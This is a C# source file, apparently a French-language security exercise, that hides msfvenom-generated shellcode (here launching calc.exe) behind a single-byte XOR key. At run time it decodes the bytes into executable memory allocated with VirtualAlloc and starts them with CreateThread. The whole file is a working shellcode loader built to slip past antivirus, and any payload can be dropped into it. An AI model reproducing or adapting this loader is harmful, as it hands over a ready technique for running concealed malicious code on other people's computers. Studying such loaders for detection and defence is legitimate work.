
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Exercice3
{
    internal class Program
    {
        private static uint cle = 0x87;

        private static byte[] xorDechiffrementBytes(byte[] chiffre)
        {
            byte[] dechiff = new byte[chiffre.Length];
            for (int i = 0; i < chiffre.Length; i++)
            {
                dechiff[i] = (byte)((uint)chiffre[i] ^ cle);
            }
            return dechiff;
        }

        private static string xorDechiffrementString(byte[] chiffre)
        {
            string dechiff = "";
            for (int i = 0; i < chiffre.Length; i++)
            {
                dechiff += (char)((uint)chiffre[i] ^ cle);
            }
            return dechiff;
        }

        public const uint EXECUTEREADWRITE = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, Int32 dwMilliseconds);
        public static void Main()
        {
            //msfvenom - p windows/x64/exec CMD=calc.exe - f csharp - o tableau.cs
//Tableau après chiffrement XOR
            byte[] buffEnc = new byte[276] {
0x7b, 0xcf, 0x04, 0x63, 0x77, 0x6f, 0x47, 0x87, 0x87, 0x87, 0xc6, 0xd6, 0xc6, 0xd7, 0xd5,
0xd6, 0xd1, 0xcf, 0xb6, 0x55, 0xe2, 0xcf, 0x0c, 0xd5, 0xe7, 0xcf, 0x0c, 0xd5, 0x9f, 0xcf,
0x0c, 0xd5, 0xa7, 0xcf, 0x0c, 0xf5, 0xd7, 0xcf, 0x88, 0x30, 0xcd, 0xcd, 0xca, 0xb6, 0x4e,
0xcf, 0xb6, 0x47, 0x2b, 0xbb, 0xe6, 0xfb, 0x85, 0xab, 0xa7, 0xc6, 0x46, 0x4e, 0x8a, 0xc6,
0x86, 0x46, 0x65, 0x6a, 0xd5, 0xc6, 0xd6, 0xcf, 0x0c, 0xd5, 0xa7, 0x0c, 0xc5, 0xbb, 0xcf,
0x86, 0x57, 0x0c, 0x07, 0x0f, 0x87, 0x87, 0x87, 0xcf, 0x02, 0x47, 0xf3, 0xe0, 0xcf, 0x86,
0x57, 0xd7, 0x0c, 0xcf, 0x9f, 0xc3, 0x0c, 0xc7, 0xa7, 0xce, 0x86, 0x57, 0x64, 0xd1, 0xcf,
0x78, 0x4e, 0xc6, 0x0c, 0xb3, 0x0f, 0xcf, 0x86, 0x51, 0xca, 0xb6, 0x4e, 0xcf, 0xb6, 0x47,
0x2b, 0xc6, 0x46, 0x4e, 0x8a, 0xc6, 0x86, 0x46, 0xbf, 0x67, 0xf2, 0x76, 0xcb, 0x84, 0xcb,
0xa3, 0x8f, 0xc2, 0xbe, 0x56, 0xf2, 0x5f, 0xdf, 0xc3, 0x0c, 0xc7, 0xa3, 0xce, 0x86, 0x57,
0xe1, 0xc6, 0x0c, 0x8b, 0xcf, 0xc3, 0x0c, 0xc7, 0x9b, 0xce, 0x86, 0x57, 0xc6, 0x0c, 0x83,
0x0f, 0xcf, 0x86, 0x57, 0xc6, 0xdf, 0xc6, 0xdf, 0xd9, 0xde, 0xdd, 0xc6, 0xdf, 0xc6, 0xde,
0xc6, 0xdd, 0xcf, 0x04, 0x6b, 0xa7, 0xc6, 0xd5, 0x78, 0x67, 0xdf, 0xc6, 0xde, 0xdd, 0xcf,
0x0c, 0x95, 0x6e, 0xd0, 0x78, 0x78, 0x78, 0xda, 0xcf, 0x3d, 0x86, 0x87, 0x87, 0x87, 0x87,
0x87, 0x87, 0x87, 0xcf, 0x0a, 0x0a, 0x86, 0x86, 0x87, 0x87, 0xc6, 0x3d, 0xb6, 0x0c, 0xe8,
0x00, 0x78, 0x52, 0x3c, 0x77, 0x32, 0x25, 0xd1, 0xc6, 0x3d, 0x21, 0x12, 0x3a, 0x1a, 0x78,
0x52, 0xcf, 0x04, 0x43, 0xaf, 0xbb, 0x81, 0xfb, 0x8d, 0x07, 0x7c, 0x67, 0xf2, 0x82, 0x3c,
0xc0, 0x94, 0xf5, 0xe8, 0xed, 0x87, 0xde, 0xc6, 0x0e, 0x5d, 0x78, 0x52, 0xe4, 0xe6, 0xeb,
0xe4, 0xa9, 0xe2, 0xff, 0xe2, 0x87
};

            int scBuf = buffEnc.Length; //Pour avoir sa taille exacte en Bytes
            //Allocation mémoire pour l'executable (Il va pointer vers une zone mémoire vide MAIS exécutable
            IntPtr ptrAddr = VirtualAlloc(IntPtr.Zero, scBuf, COMMIT_RESERVE, EXECUTEREADWRITE);
            byte[] buf = xorDechiffrementBytes(buffEnc);
            Marshal.Copy(buf, 0, ptrAddr, scBuf);
            IntPtr ptrThreadId = CreateThread(IntPtr.Zero, 0, ptrAddr, IntPtr.Zero, 0, 0);
            uint waitResult = WaitForSingleObject(ptrThreadId, -1);
        }
    }

}
